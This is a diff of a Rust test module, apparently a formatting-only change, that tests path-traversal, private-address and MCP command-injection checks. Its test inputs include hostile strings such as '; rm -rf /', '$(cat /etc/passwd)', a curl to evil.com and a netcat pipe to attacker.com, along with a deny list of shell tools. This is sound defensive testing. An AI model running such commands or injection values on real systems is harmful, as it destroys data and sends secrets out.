@@ -31,7 +31,8 @@ mod tests {
 
         fn is_path_traversal(path: &str) -> bool {
             let p = PathBuf::from(path);
-            p.components().any(|c| matches!(c, std::path::Component::ParentDir))
+            p.components()
+                .any(|c| matches!(c, std::path::Component::ParentDir))
         }
 
         assert!(is_path_traversal("../../etc/passwd"));
@@ -58,14 +59,34 @@ mod tests {
 
             // Block private/loopback/link-local addresses
             let private_prefixes = [
-                "127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
-                "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
-                "172.24.", "172.25.", "172.26.", "172.27.", "172.28.",
-                "172.29.", "172.30.", "172.31.", "169.254.", "[::1]",
-                "0.0.0.0", "localhost",
+                "127.",
+                "10.",
+                "192.168.",
+                "172.16.",
+                "172.17.",
+                "172.18.",
+                "172.19.",
+                "172.20.",
+                "172.21.",
+                "172.22.",
+                "172.23.",
+                "172.24.",
+                "172.25.",
+                "172.26.",
+                "172.27.",
+                "172.28.",
+                "172.29.",
+                "172.30.",
+                "172.31.",
+                "169.254.",
+                "[::1]",
+                "0.0.0.0",
+                "localhost",
             ];
 
-            private_prefixes.iter().any(|prefix| host.starts_with(prefix) || host == *prefix)
+            private_prefixes
+                .iter()
+                .any(|prefix| host.starts_with(prefix) || host == *prefix)
         }
 
         assert!(is_private_url("http://127.0.0.1/admin"));
@@ -85,7 +106,11 @@ mod tests {
         // Verify no dangerous commands are allowed
         let dangerous = ["rm", "sh", "bash", "curl", "wget", "nc", "perl", "ruby"];
         for cmd in &dangerous {
-            assert!(!allowlist.contains(cmd), "{} should not be in MCP allowlist", cmd);
+            assert!(
+                !allowlist.contains(cmd),
+                "{} should not be in MCP allowlist",
+                cmd
+            );
         }
     }
 
@@ -114,6 +139,9 @@ mod tests {
         assert!(validate_mcp_command("npx", &["; rm -rf /".into()]).is_err());
         assert!(validate_mcp_command("node", &["$(cat /etc/passwd)".into()]).is_err());
         assert!(validate_mcp_command("python3", &["`curl evil.com`".into()]).is_err());
-        assert!(validate_mcp_command("npx", &["package".into(), "| nc attacker.com 4444".into()]).is_err());
+        assert!(
+            validate_mcp_command("npx", &["package".into(), "| nc attacker.com 4444".into()])
+                .is_err()
+        );
     }
 }
